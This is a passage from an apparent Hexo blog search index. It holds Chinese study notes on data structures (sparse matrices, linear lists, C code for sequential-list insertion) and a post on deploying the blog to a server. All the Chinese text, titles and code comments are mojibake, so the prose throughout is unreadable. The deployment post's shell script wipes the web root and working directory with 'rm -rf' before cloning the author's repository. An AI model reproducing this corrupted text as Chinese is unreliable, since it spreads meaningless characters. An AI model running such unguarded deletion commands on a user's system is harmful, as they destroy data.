alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ç¨€ç–çŸ©é˜µçš„ä¸‰å…ƒç»„æ—¢å¯ä»¥é‡‡ç”¨æ•°ç»„å­˜å‚¨ï¼Œä¹Ÿå¯ä»¥é‡‡ç”¨åå­—é“¾è¡¨å‘å­˜å‚¨ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> è€ƒç ”ä¸“ä¸šè¯¾ </category>
          
          <category> æ•°æ®ç»“æ„ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 408 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexoéƒ¨ç½²æœåŠ¡å™¨</title>
      <link href="/posts/27a95d1a.html"/>
      <url>/posts/27a95d1a.html</url>
      
        <content type="html"><![CDATA[<h1 id="èƒŒæ™¯"><a class="markdownIt-Anchor" href="#èƒŒæ™¯">#</a> èƒŒæ™¯ï¼š</h1><h2 id="ç¬¨åŠæ³•"><a class="markdownIt-Anchor" href="#ç¬¨åŠæ³•">#</a> ç¬¨åŠæ³•ï¼š</h2><p>â€‹æˆ‘åœ¨ç»è¿‡æ— æ•°æ¬¡çš„å°è¯•ä¹‹åï¼Œå‘ç°æ— è®ºæˆ‘æ€ä¹ˆæ“ä½œï¼Œéƒ½å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯ git æ— æ³•æˆåŠŸæ¨é€åˆ°æœåŠ¡å™¨ï¼Œè¿™ä¸ªå°±å¾ˆéš¾åŠäº†ï¼Œæ‰€ä»¥ï¼Œä¸ªäººæ„Ÿè§‰åªæœ‰ä½¿ç”¨ä¸€ä¸ªæœ¬åŠæ³•æ‰èƒ½æ“ä½œäº†ï¼Œå¦‚ä¸‹ï¼š</p><p>â€‹é¦–å…ˆï¼Œè€åŠæ³•ï¼Œå°†æˆ‘ä»¬çš„ hexo æ¨é€åˆ° GitHub ä¸Šï¼Œä¹‹åç­‰ä¸€ä¼šå„¿ï¼Œèƒ½çœ‹äº†ä¹‹åå†è¯´ï¼Œ</p><p>â€‹ç„¶åï¼Œæˆ‘ä»¬åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šè¿è¡Œä»¥ä¸‹ä»£ç ï¼ˆå‰æï¼Œåˆ›å»ºä¸€ä¸ª / Temp ç›®å½•ï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /Temp/blog</span><br><span class="line">rm -rf *</span><br><span class="line">rm -rf /var/www/html/*</span><br><span class="line">git clone https://github.com/g01den1/g01den1.github.io.git</span><br><span class="line">mv ./g01den1.github.io/* /var/www/html/</span><br><span class="line">cd /Temp/blog</span><br><span class="line">rm -rf *</span><br></pre></td></tr></table></figure><p>â€‹æœ€åï¼Œä¼¼ä¹åªèƒ½é€šè¿‡è¿™æ ·çš„æœ¬åŠæ³•æ¥è¿›è¡Œæ¨é€äº†ï¼Œåˆ«çš„åŠæ³•å°±æ²¡äº†ï¼Œä¸è¿‡å¯èƒ½åªæ˜¯å› ä¸ºæˆ‘å¤ªèœäº†ï¼Œæ‰€ä»¥æ‰å¯¼è‡´äº†è¿™ä¸ªçš„é—®é¢˜ï¼Œä¹‹åå†è§£å†³å§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å‘ç”µæ—¥å¸¸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Daily life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ•°æ®ç»“æ„ç¬”è®°-2ã€çº¿æ€§è¡¨</title>
      <link href="/posts/95e7063c.html"/>
      <url>/posts/95e7063c.html</url>
      
        <content type="html"><![CDATA[<h1 id="21-çº¿æ€§è¡¨çš„å®šä¹‰å’ŒåŸºæœ¬æ“ä½œ"><a class="markdownIt-Anchor" href="#21-çº¿æ€§è¡¨çš„å®šä¹‰å’ŒåŸºæœ¬æ“ä½œ">#</a> 2.1ã€çº¿æ€§è¡¨çš„å®šä¹‰å’ŒåŸºæœ¬æ“ä½œ</h1><p>å¦‚æœ‰ä¾µæƒè¯·è”ç³»åˆ é™¤ã€‚</p><h2 id="211-çº¿æ€§è¡¨çš„å®šä¹‰"><a class="markdownIt-Anchor" href="#211-çº¿æ€§è¡¨çš„å®šä¹‰">#</a> 2.1.1ã€çº¿æ€§è¡¨çš„å®šä¹‰ï¼š</h2><p>â€‹çº¿æ€§è¡¨æ˜¯å…·æœ‰ç›¸åŒæ•°æ®ç±»å‹çš„ n (n&gt;=0) ä¸ªæ•°æ®å…ƒç´ çš„æœ‰é™åºåˆ—ï¼Œå…¶ä¸­ n ä¸ºè¡¨é•¿ï¼Œå½“ n = 0 æ—¶çº¿æ€§è¡¨æ˜¯ä¸€ä¸ªç©ºè¡¨ã€‚è‹¥ç”¨ L å‘½åçº¿æ€§è¡¨ï¼Œåˆ™å…¶ä¸€èˆ¬è¡¨ç¤ºä¸ºï¼š</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>L</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>3</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>a</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>x</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>a</mi><mi>n</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L=(a_1,a_2,a_3,...,a_i,x_{i+1},...,a_n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>å¼ä¸­ï¼Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">a_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> æ˜¯å”¯ä¸€çš„ â€œç¬¬ä¸€ä¸ªå…ƒç´ â€ï¼Œåˆç§°è¡¨å¤´å…ƒç´ ï¼›<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">a_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> æ˜¯å”¯ä¸€çš„ â€œæœ€åä¸€ä¸ªå…ƒç´ â€ï¼Œåˆç§°è¡¨å°¾å…ƒç´ ã€‚é™¤ç¬¬ä¸€ä¸ªå…ƒç´ å¤–ï¼Œæ¯ä¸ªå…ƒç´ æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªç›´æ¥å‰é©±ã€‚é™¤æœ€åä¸€ä¸ªå…ƒç´ å¤–ï¼Œæ¯ä¸ªå…ƒç´ æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªç›´æ¥åé©±ã€‚</p><p>â€‹ç”±æ­¤ï¼Œçº¿æ€§è¡¨çš„ç‰¹ç‚¹æ˜¯ï¼š</p><ul><li>è¡¨ä¸­å…ƒç´ çš„ä¸ªæ•°æœ‰é™ã€‚</li><li>è¡¨ä¸­å…ƒç´ å…·æœ‰é€»è¾‘ä¸Šçš„é¡ºåºæ€§ï¼Œè¡¨ä¸­æ•°æ®æœ‰å…¶å…ˆåæ¬¡åºã€‚</li><li>è¡¨ä¸­å…ƒç´ éƒ½æ˜¯æ•°æ®å…ƒç´ ï¼Œæ¯ä¸ªå…ƒç´ éƒ½æ˜¯å•ä¸ªæ•°æ®ã€‚</li><li>è¡¨ä¸­å…ƒç´ çš„æ•°æ®ç±»å‹éƒ½ç›¸åŒï¼Œè¿™æ„å‘³ç€æ¯ä¸ªå…ƒç´ éƒ½å æœ‰ç›¸åŒå¤§å°çš„å­˜å‚¨ç©ºé—´ã€‚</li><li>è¡¨ä¸­å…ƒç´ å…·æœ‰æŠ½è±¡æ€§ï¼Œå³ä»…è®¨è®ºå…ƒç´ é—´çš„é€»è¾‘å…³ç³»ï¼Œè€Œä¸è€ƒè™‘å…ƒç´ ç©¶ç«Ÿè¡¨ç¤ºä»€ä¹ˆå†…å®¹ã€‚</li></ul><h2 id="212-çº¿æ€§è¡¨çš„æ“ä½œ"><a class="markdownIt-Anchor" href="#212-çº¿æ€§è¡¨çš„æ“ä½œ">#</a> 2.1.2ã€çº¿æ€§è¡¨çš„æ“ä½œï¼š</h2><p>â€‹çº¿æ€§è¡¨çš„ä¸»è¦æ“ä½œå¦‚ä¸‹ï¼š</p><blockquote><p>InitList (&amp;L)   ï¼šåˆå§‹åŒ–è¡¨ã€‚æ„é€ ä¸€ä¸ªç©ºçš„çº¿æ€§è¡¨ã€‚</p><p>Length (L) ï¼šæ±‚è¡¨é•¿ã€‚è¿”å›çº¿æ€§è¡¨ L çš„é•¿åº¦ï¼Œå³ L ä¸­æ•°æ®å…ƒç´ çš„ä¸ªæ•°ã€‚</p><p>LocateElem (L,e)  ï¼šæŒ‰å€¼æŸ¥æ‰¾æ“ä½œã€‚åœ¨è¡¨ L ä¸­æŸ¥æ‰¾å…·æœ‰ç»™å®šå…³é”®å­—å€¼çš„å…ƒç´ ã€‚</p><p>GetElem (L,i) ï¼šæŒ‰ä½æŸ¥æ‰¾æ“ä½œã€‚è·å–è¡¨ L ä¸­ç¬¬ i ä¸ªä½ç½®çš„å…ƒç´ çš„å€¼ã€‚</p><p>ListInsert (&amp;L,i,e)  ï¼šæ’å…¥æ“ä½œã€‚åœ¨è¡¨ L ä¸­çš„ç¬¬ i ä¸ªä½ç½®ä¸Šæ’å…¥æŒ‡å®šå…ƒç´  e ã€‚</p><p>ListDelete (&amp;L,i,&amp;e)  ï¼šåˆ é™¤æ“ä½œã€‚åˆ é™¤è¡¨ L ä¸­ç¬¬ i ä¸ªä½ç½®çš„å…ƒç´ ï¼Œå¹¶ç”¨ e è¿”å›åˆ é™¤å…ƒç´ çš„å€¼ã€‚</p><p>PrintList (L)ï¼šè¾“å‡ºæ“ä½œã€‚æŒ‰å‰åé¡ºåºè¾“å‡ºçº¿æ€§è¡¨ L çš„æ‰€æœ‰å…ƒç´ å€¼ã€‚</p><p>Empty (L)ï¼šåˆ¤ç©ºæ“ä½œã€‚è‹¥ L ä¸ºç©ºè¡¨ï¼Œåˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚</p><p>DestroyList (&amp;L)ï¼šé”€æ¯æ“ä½œã€‚é”€æ¯çº¿æ€§è¡¨ï¼Œå¹¶é‡Šæ”¾çº¿æ€§è¡¨ L æ‰€å ç”¨çš„å†…å­˜ã€‚</p></blockquote><h1 id="22-çº¿æ€§è¡¨çš„é¡ºåºè¡¨ç¤º"><a class="markdownIt-Anchor" href="#22-çº¿æ€§è¡¨çš„é¡ºåºè¡¨ç¤º">#</a> 2.2ã€çº¿æ€§è¡¨çš„é¡ºåºè¡¨ç¤ºï¼š</h1><h2 id="221-é¡ºåºè¡¨çš„å®šä¹‰"><a class="markdownIt-Anchor" href="#221-é¡ºåºè¡¨çš„å®šä¹‰">#</a> 2.2.1ã€é¡ºåºè¡¨çš„å®šä¹‰ï¼š</h2><p>â€‹çº¿æ€§è¡¨çš„é¡ºåºå‚¨å­˜åˆç§°é¡ºåºè¡¨ã€‚å®ƒæ˜¯ç”¨ä¸€ç»„åœ°å€è¿ç»­çš„å­˜å‚¨å•å…ƒä¾æ¬¡å­˜å‚¨çº¿æ€§è¡¨ä¸­çš„æ•°æ®å…ƒç´ ï¼Œä»è€Œä½¿å¾—é€»è¾‘ä¸Šç›¸é‚»çš„ä¸¤ä¸ªå…ƒç´ åœ¨ç‰©ç†ä½ç½®ä¸Šä¹Ÿç›¸é‚»ã€‚ç¬¬ 1 ä¸ªå…ƒç´ å­˜å‚¨åœ¨çº¿æ€§è¡¨çš„èµ·å§‹ä½ç½®ï¼Œç¬¬ i ä¸ªå…ƒç´ çš„å­˜å‚¨ä½ç½®åé¢ç´§è·Ÿç€å­˜å‚¨ä½ç½®çš„æ˜¯ç¬¬ i + 1 ä¸ªå…ƒç´ ï¼Œç§° i ä¸ºå…ƒç´  <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> åœ¨çº¿æ€§è¡¨ä¸­çš„ä½åºã€‚å› æ­¤ï¼Œé¡ºåºè¡¨çš„ç‰¹ç‚¹æ˜¯è¡¨ä¸­å…ƒç´ çš„é€»è¾‘é¡ºåºä¸ç‰©ç†é¡ºåºç›¸åŒã€‚</p><p>â€‹å‡è®¾çº¿æ€§è¡¨ L å­˜å‚¨çš„èµ·å§‹åœ°å€ä¸º LOC (A)ï¼Œsizeof (ElemType) æ˜¯æ¯ä¸ªæ•°æ®å…ƒç´ æ‰€å ç”¨å†…å­˜ç©ºé—´çš„å¤§å°ï¼Œåˆ™è¡¨ L æ‰€å¯¹åº”çš„é¡ºåºå­˜å‚¨å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img data-src="https://img-blog.csdnimg.cn/direct/bd840c3208a24e56b5b03ad912b601bf.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹é€šå¸¸ç”¨é«˜çº§è¯­è¨€ä¸­çš„æ•°ç»„æ¥æè¿°çº¿æ€§è¡¨çš„é¡ºåºå­˜å‚¨ç»“æ„ã€‚</p><p>â€‹å‡å®šçº¿æ€§è¡¨çš„å…ƒç´ ç±»å‹ä¸º ElemType ï¼Œåˆ™çº¿æ€§è¡¨çš„é¡ºåºå­˜å‚¨ç±»å‹æè¿°ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 50<span class="comment">//å®šä¹‰çº¿æ€§è¡¨çš„æœ€å¤§é•¿åº¦</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    ElemType data[MaxSize];<span class="comment">//é¡ºåºè¡¨çš„å…ƒç´ </span></span><br><span class="line">    <span class="type">int</span> length;<span class="comment">//é¡ºåºè¡¨çš„å½“å‰é•¿åº¦</span></span><br><span class="line">&#125; SqList;<span class="comment">//é¡ºåºè¡¨çš„ç±»å‹å®šä¹‰</span></span><br></pre></td></tr></table></figure><p>â€‹ä¸€ç»´æ•°ç»„å¯ä»¥æ˜¯é™æ€åˆ†é…çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯åŠ¨æ€åˆ†é…çš„ã€‚åœ¨é™æ€åˆ†é…æ—¶ï¼Œç”±äºæ•°ç»„çš„å¤§å°å’Œç©ºé—´äº‹å…ˆå·²ç»å›ºå®šï¼Œä¸€æ—¦ç©ºé—´å æ»¡ï¼Œå†åŠ å…¥æ–°çš„æ•°æ®å°±ä¼šäº§ç”Ÿæº¢å‡ºï¼Œè¿›è€Œå¯¼è‡´ç¨‹åºå´©æºƒã€‚</p><p>â€‹è€Œåœ¨åŠ¨æ€åˆ†é…æ—¶ï¼Œå­˜å‚¨æ•°ç»„çš„ç©ºé—´å®åœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­é€šè¿‡åŠ¨æ€å­˜å‚¨åˆ†é…è¯­å¥åˆ†é…åˆ°ï¼Œä¸€æ—¦æ•°æ®ç©ºé—´å æ»¡ï¼Œå°±å¦å¤–å¼€è¾Ÿä¸€å—æ›´å¤§çš„å­˜å‚¨ç©ºé—´ï¼Œç”¨ä»¥æ›¿æ¢åŸæ¥çš„å­˜å‚¨ç©ºé—´ï¼Œä»è€Œè¾¾åˆ°æ‰©å……å­˜å‚¨æ•°ç»„ç©ºé—´çš„ç›®çš„ï¼Œè€Œä¸éœ€è¦ä¸ºçº¿æ€§è¡¨ä¾æ¬¡æ€§åœ°åˆ’åˆ†æ‰€æœ‰ç©ºé—´ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> InitSize 100<span class="comment">//è¡¨é•¿åº¦çš„åˆå§‹å®šä¹‰</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">ElemType *data;<span class="comment">//æŒ‡ç¤ºåŠ¨æ€åˆ†é…æ•°ç»„çš„æŒ‡é’ˆ</span></span><br><span class="line">    <span class="type">int</span> MaxSize,length;<span class="comment">//æ•°ç»„çš„æœ€å¤§å®¹é‡å’Œå½“å‰ä¸ªæ•°</span></span><br><span class="line">&#125; SeqList;<span class="comment">//åŠ¨æ€åˆ†é…æ•°ç»„é¡ºåºè¡¨å®šä¹‰</span></span><br></pre></td></tr></table></figure><p>â€‹C è¯­è¨€åˆå§‹åŠ¨æ€åˆ†é…è¯­å¥ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L.data = (ElemType*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ElemType)*InitSize);</span><br></pre></td></tr></table></figure><p>â€‹é¡ºåºè¡¨æœ€ä¸»è¦çš„ç‰¹ç‚¹æ˜¯éšæœºè®¿é—®ï¼Œå³é€šè¿‡é¦–åœ°å€å’Œå…ƒç´ åºå·å¯åœ¨æ—¶é—´ O (1) å†…æ‰¾åˆ°æŒ‡å®šçš„å…ƒç´ ã€‚</p><p>â€‹é¡ºåºè¡¨çš„å­˜å‚¨å¯†åº¦é«˜ï¼Œæ¯ä¸ªç»“ç‚¹åªå­˜å‚¨æ•°æ®å…ƒç´ ã€‚</p><p>â€‹é¡ºåºè¡¨é€»è¾‘ä¸Šç›¸é‚»çš„å…ƒç´ ç‰©ç†ä¸Šä¹Ÿç›¸é‚»ï¼Œæ‰€ä»¥æ’å…¥å’Œåˆ é™¤æ“ä½œéœ€è¦ç§»åŠ¨å¤§é‡å…ƒç´ ã€‚</p><h2 id="222-é¡ºåºè¡¨ä¸ŠåŸºæœ¬æ“ä½œçš„å®ç°"><a class="markdownIt-Anchor" href="#222-é¡ºåºè¡¨ä¸ŠåŸºæœ¬æ“ä½œçš„å®ç°">#</a> 2.2.2ã€é¡ºåºè¡¨ä¸ŠåŸºæœ¬æ“ä½œçš„å®ç°ï¼š</h2><h3 id="1-æ’å…¥æ“ä½œ"><a class="markdownIt-Anchor" href="#1-æ’å…¥æ“ä½œ">#</a> ï¼ˆ1ï¼‰ã€æ’å…¥æ“ä½œï¼š</h3><p>â€‹åœ¨é¡ºåºè¡¨ L çš„ç¬¬ i (1&lt;= i &lt;= L.Length+1) ä¸ªä½ç½®æ’å…¥æ–°å…ƒç´  e ã€‚è‹¥ i çš„è¾“å…¥ä¸åˆæ³•ï¼Œåˆ™è¿”å› false ï¼Œè¡¨ç¤ºæ’å…¥å¤±è´¥ï¼›å¦åˆ™ï¼Œå°†ç¬¬ i ä¸ªå…ƒç´ åŠå…¶åçš„æ‰€æœ‰å…ƒç´ ä¾æ¬¡å¾€åç§»åŠ¨ä¸€ä¸ªä½ç½®ï¼Œè…¾å‡ºä¸€ä¸ªç©ºä½ç½®æ’å…¥æ–°å…ƒç´  e ï¼Œé¡ºåºè¡¨é•¿åº¦å¢åŠ  1ï¼Œæ’å…¥æˆåŠŸï¼Œè¿”å› trueã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 50</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> data[MaxSize];</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">&#125; SqList;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ListInsert</span><span class="params">(SqList *L,<span class="type">int</span> i , <span class="type">int</span> e)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    SqList L;</span><br><span class="line">    L.length = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)&#123;</span><br><span class="line">        L.data[i] = i + <span class="number">1</span>;</span><br><span class="line">        L.length += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ListInsert(&amp;L,<span class="number">4</span>,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; L.length; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,L.data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%d&quot;</span>,L.length);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°æ’å…¥ç®—æ³•çš„ä¸»ä½“å‡½æ•°</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ListInsert</span><span class="params">(SqList *L,<span class="type">int</span> i , <span class="type">int</span> e)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span> || i &gt; L-&gt;length + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (L-&gt;length &gt;= MaxSize)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = L-&gt;length;j &gt;= i;j--)</span><br><span class="line">        L-&gt;data[j] = L-&gt;data[j<span class="number">-1</span>];</span><br><span class="line">    L-&gt;data[i - <span class="number">1</span>] = e;</span><br><span class="line">    L-&gt;length ++;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹<strong>æ³¨æ„ï¼šåŒºåˆ«é¡ºåºè¡¨çš„ä¸ºåºå’Œæ•°ç»„ä¸‹æ 